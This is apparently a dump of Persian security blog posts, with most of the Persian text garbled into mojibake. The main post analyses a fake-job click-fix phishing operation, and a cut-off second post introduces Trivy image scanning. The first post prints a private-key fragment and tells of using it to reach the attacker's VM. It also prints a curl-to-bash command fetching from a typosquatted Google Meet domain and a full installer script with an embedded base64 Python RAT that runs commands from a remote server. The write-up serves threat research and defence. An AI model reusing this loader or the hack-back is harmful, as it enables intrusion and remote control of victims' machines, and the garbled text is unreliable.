Yr1urOA62dbFKgDdh33b3bVonP4phk+PNVkXeiELxulTiMCgzEt2HKdovQ54qc8Avy04jx cuQJy8nwzvuKTDqRqc0fkOgjPhnfGdah/1xnFxLZzB4v0uSKHKSSrb4TO2FJqRl5zU+epC is07kkxfQZsAAAAZaGFycnlraW5nOTQwNjEwQGdtYWlsLmNvbQEC -----END OPENSSH PRIVATE KEY----- ุจุฑุง ุงุทููุงู ุชุณุช ฺฉุฑุฏู ฺฉู ุขุง ุงูู public key ฺฉู ุจู ูุง ุฏุงุฏ ู ุงู private key ุฌูุช ูุณุชูุฏ ุง ุฎุฑ:\n1 2 3 4 5 6 7 8 $ [ \u0026#34;$(ssh-keygen -y -f key \\ | ssh-keygen -lf - \\ | awk \u0026#39;{print $2}\u0026#39;)\u0026#34; = \u0026#34;$(ssh-keygen -lf key.pub \\ | awk \u0026#39;{print $2}\u0026#39;)\u0026#34; ] \\ \u0026amp;\u0026amp; echo \u0026#34;MATCH\u0026#34; \\ || echo \u0026#34;NO MATCH\u0026#34; MATCH ุจููุ ฺฉูุฏ ุฎูุฏุด ุจูุฏ ๐. ุฏุงุดุชู ูพูู ู ฺฉุฑุฏู ฺฉู ุฏุณุชุฑุณ ููู ุฑู Persist ฺฉูู ฺฉู ฺฉุงูฺฉุดู ุฑู ูุทุน ฺฉุฑุฏ. ุฏุฑ ฺฉู ูฺฉุฑ ูฺฉูู ฺฉูุชุฑ ุงุฒ ฺฉ ุฏููู ุจุดุชุฑ ุฏุณุชุฑุณ ูุฏุงุดุชู ุจูุด.\nฺูู ุฎู ุณุฑุน ู ุจ ุจุฑูุงูู ุฌูู ุฑูุชู ู ูุตุฏ ุฎุฑุงุจฺฉุงุฑ ูู ูุฏุงุดุชูุ ฺฉุงุฑููู ฺฉู ูุงููุธู ูพุด ุฑูุช ู ุงูุจุชู ฺูู ุงุฒ ุฏุงุฎู ุงุฑุงู ููุดู ุงู ููุงุฑุฏ ุฑู ูพฺฏุฑ ูุงููู ฺฉุฑุฏ ุฎู ูพูู ุฎุงุต ูุฏุงุดุชู. ูู ุฎุจ ุงูุงู ฺฉู ุงู ูุชู ุฑู ุฏุงุฑู ู ููุณูุ ุจุง ุฎูุฏู ูฺฏู ุง ฺฉุงุด ฺฉ ุฏุฑุณ ุนุจุฑุช ุฏุฑุณุช ู ุญุณุงุจ ุจูุด ู ุฏุงุฏู.\nุงุฏุงูู ูุงุฌุฑุง: ููุดู  ุฌุฏุฏ ููุงุฌู ุจุนุฏ ุงุฒ ุงูฺฉู ุดู ุจุณุชู ุดุฏุ ุดุฑูุน ฺฉุฑุฏ ุบุฑ ุฒุฏู ฺฉู:\nยซุขูุง ูู ูุตู ูุดุฏู ฺ ุดุฏุยป\nููู ฺฏูุชู: ยซุงุญุชูุงูุงู ุจู ุฎุงุทุฑ ุงูุชุฑูุช ู ูุงุฑูุงูู. ู ุจุงุฑ ุฏฺฏู ุจุฒู ุชุณุช ฺฉูู.ยป\nูู ุจู ูุธุฑ ูโุฑุณุฏ ฺฉู ุดฺฉ ฺฉุฑุฏู ุจูุฏุ ฺูู ุฏูุจุงุฑู ฺฉุงููุฏ ุฑู ูุฒุฏ. ูุง ูู ุจุฎุงู ุดุฏูุ ุฏุฏู ุจูุฏู ฺฉู ูุงุดู ฺฉู ุงุฒุด ุฏุณุชุฑุณ ฺฏุฑูุชู ุจูุฏูุ ููุท ู VM ุจูุฏู ฺฉู ุงุญุชูุงูุงู ุจู ุนููุงู ฺฉ ุงุฒ ูพุฑุงฺฉุณ ูุงุด ุงุณุชูุงุฏู ูฺฉูู. ุงูุจุชู ุงุญุชูุงูุง ูุดุฏ ุงุฒ ููููุฌุง ุจู ุฏุงุฏู ูุง ุจุฏุฑุฏ ุจุฎูุฑุชุฑ ุจุฑุณู.\nุฎูุงุตู ุจุนุฏ ุงุฒ ฺูุฏ ุณุงุนุช ุชุตูู ฺฏุฑูุชู ุฏูุจุงุฑู ุฑู ูุฎุด ฺฉุงุฑ ฺฉูู. ุจุฑุงุด ููุดุชู ฺฉู:\nยซุญุงุฌ ุจุง ูุตู ุดูุ ููุช ูุง ุฑู ุชูู ฺฉุฑุฏุ ุฎู ูุงูุฑุฏ ูพฺููุฏ ูุงุฑู!ยป\nุงู ุจุงุฑ ฺฏูุช: ยซุงุตูุงู ุจุง ุจุฑู Google Meet ุตุญุจุช ฺฉูู.ยป\nูุง ุงูู ูฺฉุฑ ฺฉุฑุฏู ูุงูุนุงู ู ุฎูุงุฏ ุจุง ู ุชุฑููุฏ ุจุงุฏ ุชู ุฌูุณู ู ุจุนุฏ ูุซูุง ูุงุฑู ุจุจุฑู ุจู ุณูุช ฺฉู RATุด ุฑู ูุนุงู ฺฉูู. ฺฏูุชู ุจุงุดู ฺฉู ุงูู ูุณุท ูุง ุฏูุจุงุฑู ุจูุด ูพููุชฺฉ ุจุฒูู ุชุง ุงูู ุจุงุฒู ฺฉุงููุฏ ุฏูุฎูุงู ูุง ุฑู ุฑุงู ฺฉูู.ยู ููฺฉ ูุฑุณุชุงุฏ:\n1 https://meet.google.join-uk[.]com/ygt-mnek-hwm ุจูโุจูุ ู Typosquatting ุฑู ุฏุงููู  Google Meet! ุงูุฌุง ุฏฺฏู ุฎู ุชุงุจูู ุดุฏ ฺฉู ููุดูโ ุฌุฏุฏ ุฏุฑ ฺฉุงุฑู. ูู ููุดูโุงุด ฺ ู ุชููู ุจุงุดูุ ููฺฉ ุฑู ุจุงุฒ ูฺฉุฑุฏู ูู ู curl ุฒุฏู ุจุจูู ูุญุชูุง ุงู ุตูุญู ฺูุ ู ุฏุฏู ุจููโฆ ุงุณุชุงุฏ ุฏูุจุงู click-fix ุฒุฏู ุฑู ูุงุณุช.ยุญุงูุง click-fix ฺูุ ู ุชูุถุญ ูุฎุชุตุฑุด ุงูู ุชู ูุฏู ุฌุฏุฏ ุงุฒ ูุดูฺฏ ุจู ุงุณู click-fixุ ุณุงุช ููุงุจ ุฎูุฏุด ุฑู ุฌุง ุณุฑูุณ ูุง ูุซู Google Meet ูุฒูู ู ุจู ฺฉุงุฑุจุฑ ุฎุทุง ุณุงุฎุชฺฏ ูุดูู ูุฏู: ูุซูุงู ูฺฏู \u0026ldquo;ูฺฉุฑูููู ุง ุฏูุฑุจูุช ูุดฺฉู ุฏุงุฑูุ ููุชูู ุฌูู ุจุด\u0026rdquo;. ุจุนุฏ ู ุฏฺฉูู  \u0026ldquo;Fix\u0026rdquo; ูุฐุงุฑู ฺฉู ุจุง ุฒุฏูุด ุฏุณุชูุฑุงูุนูู ูุฏูุ ูุซูุงู ู ุฎุท powershell ุง bash ุขูุงุฏู. ฺฉุงุฑุจุฑ ูู ูฺฉุฑ ูฺฉูู ุงู ุฑุงู ุญู ุฑุณูู ู ูููู ุฑู ุชู ุชุฑููุงู ุงุฌุฑุง ูฺฉููุ ุฏุฑ ุญุงู ฺฉู ุฏุงุฑู ุจุฏุงูุฒุงุฑ ุฑู ุจุง ุฏุณุช ุฎูุฏุด ูุตุจ ูฺฉูู.\nูพููุฏ ุฑู ุจุงุฒ ฺฉุฑุฏู ู ุจุฑุฑุณ ฺฉุฑุฏู. ุฏุณุชูุฑ ุจู ุงู ุดฺฉู ุจูุฏ:\n1 2 3 4 $ echo \u0026#39;L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWtmc1NMIGh0dHBzOi8vbWVldC5nb29nbGUuam9pbi11ay5jb20vc3VwcG9ydC9hdWRpb19kcml2ZXJfaW5zdGFsbGVyLnNoK SI=\u0026#39; | base64 -d /bin/bash -c \u0026#34;$(curl -kfsSL https://meet.google.join-uk[.]com/support/audio_driver_installer.sh)\u0026#34; ุจุนุฏ ูุงู audio_driver_installer.sh ุฑู ุฏุงูููุฏ ู ุจุงุฒ ฺฉุฑุฏู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #!/bin/bash PYTHON=$(command -v python3 || command -v python) if [ -z \u0026#34;$PYTHON\u0026#34; ]; then exit 1 fi TMP_PY_SCRIPT=$(mktemp /tmp/systems-private-3f27e703481c43aab27860c1df4e14b1XXXX) cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; \u0026gt; \u0026#34;$TMP_PY_SCRIPT\u0026#34; import sys import os import string import urllib.request import urllib.error import http.client import json import struct import time import array import socket import ctypes import ctypes as ct import os.path import subprocess import platform from ctypes import wintypes as w from pathlib import Path import base64 import threading import random import ssl error_de = \u0026#34;YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHA6Ly9zZWFyY2hib3guaW5mby9wcmVmZXIucGhwIg0KDQo=\u0026#34; din_dat = \u0026#34;dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI=\u0026#34; sdat = base64.b64decode(error_de) if(sdat==\u0026#34;\u0026#34;): sdat = is_url_valid(sdat) kerrs = sdat + base64.b64decode(\u0026#34;Cg==\u0026#34;) kerrs += base64.b64decode(din_dat) exec(kerrs) EOF nohup \u0026#34;$PYTHON\u0026#34; \u0026#34;$TMP_PY_SCRIPT\u0026#34; \u0026gt; nohup.out 2\u0026gt;\u0026amp;1 \u0026amp; ฺฉู ุฏุฑ ูุงูุน ูููู RAT ูุจู ุจุง ูููู ูฺฉุงูุฒู ูุง ุชูุถุญ ุฏุงุฏู ุดุฏูุ ุฑู ุฏูุจุงุฑู ุฑู ุณุณุชู ูุฑุจุงู ุงุฌุฑุง ู ฺฉุฑุฏ.\nุฌูุน ุจูุฏ ุดุงุฏ ูููุชุฑู ูพุงู ุงู ูุงุฌุฑุง ู ูุดุฏุงุฑ ุฌุฏ ุจุงุดู ฺฉู \u0026ldquo;ูุฑุงูุจ ุจุงุดู\u0026rdquo;. ฺูู ุงู ูุฏู ุงุฒ ุชุงฺฉุชฺฉ ูุง ูููุฏุณ ุงุฌุชูุงุนุ ุจุฎุตูุต ุงุฒ ุทุฑู ูพุดููุงุฏูุง ฺฉุงุฑ ุฌุนูุ ุจู ุตูุฑุช ูุงุฑฺ ฺฏููู ุฏุฑ ุญุงู ุฑุดุฏู. ุฏุฑุณุชู ฺฉู ุงู ุญูููโูุง ูุฒููุง ฺฉุงุฑ ฺฏุฑูู ูุง ูฺฉุฑ ุฏููุช (nation-state actors) ูุณุชุ ุงูุง ุฌุงูุนูโ ุฎู ุจุฒุฑฺฏ ุงุฒ ุชุจูฺฉุงุฑูุง ุณุงุจุฑ ูุฌูุฏ ุฏุงุฑู ฺฉู ูุนุงูุงูู ุฏุงุฑู ุงุฒ ุงู ุชฺฉูฺฉโูุง ุฌุฏุฏ ุจุฑุง ูุฑุจ ุงูุฑุงุฏ ุงุณุชูุงุฏู ูฺฉูู. ุงููุง ุจุง ุฎูุงูุชุ ุงุฒ ูพุฑูฺู ูุง ุชุณุช ุขููุฏู ฺฏุฑูุชู ุชุง ฺฉูุงูุจุฑุฏุงุฑ ูุง ูุดูฺฏุ ุงุฒ ุงุนุชูุงุฏ ู ุงูฺฏุฒูโ ุจุฑูุงูู ููุณโูุง ุณู ุงุณุชูุงุฏู ูโฺฉูู ุชุง ุจู ุงูุฏุงูุดูู ุจุฑุณู. ูพุณ ุญูุธ ููุดุงุฑ ู ุฏุงุดุชู ุดฺฉ ู ุชุฑุฏุฏ ููุทู ุฏุฑ ุจุฑุงุจุฑ ูุฑ ูพุดููุงุฏ ูุงุฎูุงุณุชูุ ุฏฺฏู ููุท ฺฉ ุชูุตู ูุณุช!ุ ุจูฺฉู ู ุณูพุฑ ุฏูุงุน ุถุฑูุฑ ุฏุฑ ููุงุจู ุงู ุชูุฏุฏูุง ูุญุณูุจ ูุดู.\nุดุงุฎุต ูุง ุชูุฏุฏ (IOCs) ุฏุงููู ูุง VPN: 5.223.53[.]161 netupdates[.]info โ 45.61.139[.]22\nsearchbox[.]info โ 162.33.177[.]48\nwithharry[.]pro โ 162.33.177[.]47\nmeet.google.join-uk[.]com โ 144.172.103[.]23\nุงูู harryking940610@gmail[.]com\nnicholasharper000@gmail[.]com\nูุงู ูุง chartflow_analysis_deploy.zip โ sha1: ee0d6cc029f90a7a0b18c8c9980c906d3cef5cbb\naudio_driver_installer.sh โ sha1: 5de93beec432a5271deca2a91343bd669cc553e8\npassword: as2025\nhttps://github.com/miladbr/Threat-Intel-Writeups/tree/main/Operation-Fake-Job\nุญุณุงุจ ูุง Twitter: [https://x.com/HarryK1ng62657](https://x.com/HarryK1ng62657) Twitter: https://x.com/HarperNich46559/\nGitHub: https://github.com/HarryKingWork\n","date":"2025-08-15T03:02:00Z","image":"https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover_hu_6688a84e40f870d6.png","permalink":"https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/","title":"ุนููุงุช ูุนฺฉูุณ ุดฺฉุงุฑฺู ุดฺฉุงุฑ ุดุฏู"},{"content":" ููุฏูู ุฏุฑ ุฑูุฒูุง ฺฏุฐุดุชู ุขุณุจโูพุฐุฑโ Log4Shell (CVE-2021-44228, CVE-2021-45046) ุฏุฑ ุตุฏุฑ ุงุฎุจุงุฑ ุญูุฒูโ ุงููุช ููุงูุฑ ุงุทูุงุนุงุช ุจูุฏู ุงุณุช. ุจุณุงุฑ ุงุฒ ุดุฑฺฉุชโูุง ุจุฑุง ุดูุงุณุง ู ุฑูุน ุงู ุขุณุจโูพุฐุฑ ุฏฺุงุฑ ฺุงูุด ุดุฏู ุจูุฏูุฏ. ุจุฑุง ุดูุงุณุง ุงู ุขุณุจโูพุฐุฑ ุงุจุฒุงุฑโูุง ู ฺฉโุฎุทโูุง (one-liners) ูุฎุชูู ุฏุฑ ุฏุณุชุฑุณ ุจูุฏู ุงุณุช. ูุง ุฏุฑ ููโุฑูุด ุจุฑุง ุดูุงุณุง ู ฺฉูฺฉ ุจู ูุดุชุฑุงู ฺฉู ุขุณุจโูพุฐุฑ ุจูุฏูโุงูุฏ ุงุฒ ุงุจุฒุงุฑ Trivy ุงุณุชูุงุฏู ฺฉุฑุฏู. ุฏุฑ ฺฉูุงุณุชุฑโูุง ููโุฑูุด ุจู ุตูุฑุช ูุฏุงูู ุฏุฑ ุจุงุฒูโูุง ุฒูุงู ูุนู ฺฉุงูุชูุฑโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุชูุณุท Trivy ูพูุด ูโุดููุฏ. ุฏุฑ ุงู ููุฑุฏ ุฎุงุต ุจู ุนูุช ุงููุช ุงู ููุถูุน ูุชุงุฌ ุขุณุจโูพุฐุฑ ุฏุฑ ุงุฎุชุงุฑ ูุดุชุฑุงู ูุฑุงุฑ ฺฏุฑูุช. ูุฒุงุง ุงุณุชูุงุฏู ุงุฒ Trivy ุจู ุฌุง ุฑุงูโฺฉุงุฑูุง ุณูุช ุฏุฑ ุจุณุชุฑ ฺฉูุจุฑูุชุฒ ูุง ุฑุง ุชุฑุบุจ ฺฉุฑุฏ ฺฉู ุฏุฑ ฺฉ ููุดุชุงุฑ ุจู ูุนุฑู Trivy ู ูุญููโ ุงุณุชูุงุฏู ุงุฒ ุขู ุฏุฑ ฺุฑุฎูโ CI/CD ุฏุฑ ฺฏุชโูุจ ุจูพุฑุฏุงุฒู.\nุงููุช ุงุณฺฉู ฺฉุฑุฏู ุงูุฌโูุง ุฏุฑ DevSecOps ฺฉ ุงุฒ ฺฏุงูโูุง ุณุงุฏู ุฏุฑ ุนู ุญุงู ุจุณุงุฑ ุงุซุฑฺฏุฐุงุฑ ุฏุฑ ุจุญุซ ุงููโุณุงุฒ ุณุณุชูโูุงุ ูพูุด (scan) ุขุณุจโูพุฐุฑโูุง ุดูุงุฎุชูโุดุฏู (known vulnerabilities) ูโุจุงุดุฏ. ุจุณุงุฑ ุงุฒ ุงูพโูุง ฺฉุงูุชูุฑโุดุฏู ููฺฉู ุงุณุช ุจุฑ ูพุงูโ ฺฉ ุงูุฌ ูุฏู ุงุฌุงุฏ ุดุฏู ุจุงุดูุฏ ุง ููฺูู ููฺฉู ุงุณุช ุฏุฑ ุชูุณุนูโ ุขููุง ุงุฒ ฺฉุชุงุจุฎุงููโูุง ุงุณุชูุงุฏู ุดุฏู ุจุงุดุฏ ฺฉู ุฏุงุฑุง ุขุณุจโูพุฐุฑ ุดูุงุฎุชูโุดุฏู ุจุงุดุฏ.\nุฏุฑ ฺฉ ุจุฑูุงููโ ฺฉุงูุชูุฑ ุดุฏู ฺฉ ุขุณุจโูพุฐุฑ ุฏุฑ ุณุทุญ ุณุณุชูโุนุงูู ูโุชูุงูุฏ ุงููุช ฺฉู ุจุฑูุงูู ุฑุง ุฒุฑ ุณุคุงู ุจุจุฑุฏ. ููฺูู ฺฉ ุงุฒ ููุงุฑุฏ ฺฉู ุงุบูุจ ุชูุณุท ุจุฑูุงููโููุณโูุง ูุงุฏุฏู ฺฏุฑูุชู ูโุดูุฏ ูพูุด ุขุณุจโูพุฐุฑ ฺฉุชุงุจุฎุงููโูุง ุซุงูุซ ุงุณุช ฺฉู ุฏุฑ ุชูุณุนูโ ุจุฑูุงูู ููุฑุฏ ุงุณุชูุงุฏู ูุฑุงุฑ ูโฺฏุฑุฏ. ุจู ููู ุฏูู ูุงุฒู ุงุณุช ูุจู ุงุฒ ุจุฑูพุงุณุงุฒ ฺฉ ุจุฑูุงูู ุฏุฑ ูุญุท ุนููุงุช ุงุฒ ุฌูุจูโ ุงููุช ู ููฺูู ุงูุทุจุงู ุจุง ุณุงุณุชโูุง ุฎุงุต (ูุซูุงู ุจุฑูุงููโูุง ุญูุฒูโ ูพุฑุฏุงุฎุชโ ุง ูพุฒุดฺฉ) ููุฑุฏ ูพูุด ูุฑุงุฑ ุจฺฏุฑุฏ.\nุฏุฑ ุงู ุดุฑุงุท ุจุง ูพูุด ูพูุณุชู ุจุฑูุงููโูุง ุฏุฑ ุฒูุงู ุณุงุฎุช ุขูโูุงุ ุฏุฑ ฺุฑุฎูโ CI/CDุ ูโุชูุงู ุฏุฑ ูุงุฒ ุณุงุฎุช ุงูุฌ ฺฉุงูุชูุฑ ุจุฎุด ุงุฒ ุขุณุจโูพุฐุฑโูุง ุฑุง ุดูุงุณุง ฺฉุฑุฏ ู ุงุฒ ุงูุชุดุงุฑ ูุณุฎูโ ูุงุงูู ู ุจุฑูพุงุณุงุฒ ุขู ุฏุฑ ูุญุท ุนููุงุช ุฌููฺฏุฑ ฺฉุฑุฏ. ุฏุฑ ุงู ููุดุชุงุฑ ุจุฑุง ูพูุด ุงููุช ุงูุฌโูุง ุจู ูุนุฑู ุงุจุฒุงุฑ Trivy ู ูุญููโ ุงุณุชูุงุฏูโ ุขู ุฏุฑ ฺุฑุฎูโ CI/CD ุฏุฑ GitLab ูโูพุฑุฏุงุฒู.\nูุนุฑู Trivy Trivy ฺฉ ุงุจุฒุงุฑ ูุชูโุจุงุฒ ุงุณุช ฺฉู ุฏุฑ ุงุจุชุฏุง ุจู ุนููุงู ฺฉ ูพุฑูฺูโ ุดุฎุต ุจุฑุง ุฑูุน ูุงุฒููุฏ ูพูุด ุงููุช ุงูุฌ ฺฉุงูุชูุฑูุง ุฏุฑ ุจุณุชุฑ ฺฉูุจุฑูุชุฒ ุชูุณุนู ุฏุงุฏู ุดุฏ. ูพุณ ุงุฒ ุงูุชุดุงุฑ ูุณุฎูโูุง ุงููู ุฏุฑ ฺฉุงูููุชโูุง ูุชูโุจุงุฒ ุจู ุตูุฑุช ฺฏุณุชุฑุฏู ููุฑุฏ ุงุณุชูุจุงู ูุฑุงุฑ ฺฏุฑูุช. ุงูุชุดุงุฑ Trivy ุจู ุตูุฑุช ฺฉ ูุงู ุจุงูุฑ ูุณุชูู ฺฉู ูุงุจุณุชฺฏ ุจู ูฺ ูพุงฺฏุงู ุฏุงุฏูุ ฺฉุชุงุจุฎุงูู ู ุง ุณุณุชูโุนุงูู ุฎุงุต ูุฏุงุฑุฏ ุจุงุนุซ ุดุฏู ฺฉู ุงุณุชูุฑุงุฑ ู ุจูโฺฉุงุฑฺฏุฑ ุขู ุจุณุงุฑ ุณุงุฏู ู ูุทููุจ ุดูุฏ.\nTrivy ุชูุงูุง ุดูุงุณุง ุขุณุจโูพุฐุฑ ุฏุฑ ุณุทุญ ุงูุฌ ุจุฑูุงููโูุง ฺฉุงูุชูุฑโุดุฏูุ ูุงูโุณุณุชูุ ูุฎุฒู ูุจุชู ุจุฑ Git ู ููฺูู ูุงูโูุง ุชูุธูุงุช (Configuration) ุฑุง ุฏุงุฑุงุณุช. ุจู ุทูุฑ 